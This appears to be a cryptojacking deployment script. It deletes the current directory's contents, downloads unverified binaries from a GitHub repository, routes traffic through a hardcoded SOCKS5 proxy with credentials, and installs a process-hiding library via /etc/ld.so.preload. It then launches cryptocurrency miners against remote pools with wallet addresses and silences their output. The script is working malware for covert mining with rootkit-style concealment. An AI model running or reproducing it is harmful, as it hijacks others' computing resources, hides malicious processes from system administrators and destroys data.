rm -rvf * && mkdir a && cd a
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget https://github.com/usapindong/test/raw/refs/heads/main/pearl.guard && chmod +x pearl.guard

wget https://github.com/usapindong/test/raw/refs/heads/main/tawa12 && chmod +x tawa12

wget https://github.com/usapindong/test/raw/refs/heads/main/libcudart.so.12 && chmod +x libcudart.so.12

wget https://github.com/usapindong/test/raw/refs/heads/main/libpearlkernel.so.enc && chmod +x libpearlkernel.so.enc

wget https://github.com/usapindong/test/raw/refs/heads/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 103.176.78.132:443
socks5_username = ubed
socks5_password = ubed123
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget https://github.com/usapindong/test/raw/refs/heads/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp && clear && ./tawa12 --pool 37.230.62.246:80 --wallet krxYZDM9DP --worker rtx-2080 & wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod 777 sse20 && ./sse20 -a power2b -o stratum+tcp://68.183.186.109:80 -u MbVBtUuYHPKuZKV9zhhjufNzfPstvYkUBN.rtx -t $(nproc) > /dev/null 2>&1 & clear
